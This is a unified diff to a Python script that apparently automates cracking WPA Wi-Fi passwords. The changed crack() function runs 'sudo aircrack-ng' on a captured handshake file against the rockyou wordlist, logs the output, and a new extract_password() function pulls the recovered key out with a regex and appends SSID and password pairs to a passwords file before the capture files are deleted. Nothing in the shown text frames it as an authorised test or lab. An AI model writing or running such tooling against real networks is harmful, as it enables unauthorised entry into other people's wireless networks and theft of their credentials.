@@ -1,4 +1,4 @@
-import subprocess, signal, sys, time, os, shutil, csv, glob, time, threading
+import subprocess, signal, sys, time, os, shutil, csv, glob, time, threading, re
 
 def target_ap():
     file_path = "/mnt/data/access_points.txt"
@@ -81,20 +81,55 @@ def delete_file(filepath):
     else:
         print(f"{filepath} not found. Unable to delete.")
 
-def crack():
+def crack(ssid):
     cap_file_path = "/mnt/data/wpacracking/wpa.cap"
+    log_file_path = "/mnt/data/wpacracking/aircrack.log"
     if not os.path.exists(cap_file_path):
         print("wpa.cap not found, cannot proceed with cracking.")
         return
 
-    cmd = ["sudo", "aircrack-ng", cap_file_path, "-w", "/usr/share/wordlists/rockyou.txt"]
+    # Setup the command to log output to a file
+    with open(log_file_path, 'w') as log_file:
+        cmd = ["sudo", "aircrack-ng", cap_file_path, "-w", "/usr/share/wordlists/rockyou.txt"]
+        try:
+            print("Running aircrack-ng, please wait...")
+            # Direct output to both stdout and log_file
+            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            while True:
+                output = process.stdout.readline()
+                if output == '' and process.poll() is not None:
+                    break
+                if output:
+                    print(output.strip())
+                    log_file.write(output)
+            process.poll()
+        except Exception as e:
+            print(f"An error occurred during aircrack-ng execution: {e}")
+        finally:
+            # Delete cap files after attempting to crack
+            delete_file("/mnt/data/wpacracking/wpa.cap")
+            delete_file("/mnt/data/wpacracking/wep.cap")
 
+    # Search for the password in the log file and write it to passwords.txt if found
+    extract_password(ssid, log_file_path)
+
+def extract_password(ssid, log_file_path):
+    password_file_path = "/mnt/data/passwords.txt"
+    password = None
     try:
-        print("Running aircrack-ng, please wait...")
-        subprocess.run(cmd)
+        with open(log_file_path, 'r') as file:
+            contents = file.read()
+            # Regex to find the password
+            match = re.search(r'KEY FOUND! \[ (.+?) \]', contents)
+            if match:
+                password = match.group(1)
+                print(f"Password found: {password}")
+                # Write to passwords file
+                with open(password_file_path, 'a') as pwd_file:
+                    pwd_file.write(f"{ssid},{password}\n")
+            else:
+                print("No password found in the log.")
+    except FileNotFoundError:
+        print(f"Log file {log_file_path} not found.")
     except Exception as e:
-        print(f"An error occurred during aircrack-ng execution: {e}")
-    finally:
-        # Delete cap files after attempting to crack
-        delete_file("/mnt/data/wpacracking/wpa.cap")
-        delete_file("/mnt/data/wpacracking/wep.cap")
+        print(f"An error occurred while extracting the password: {e}")
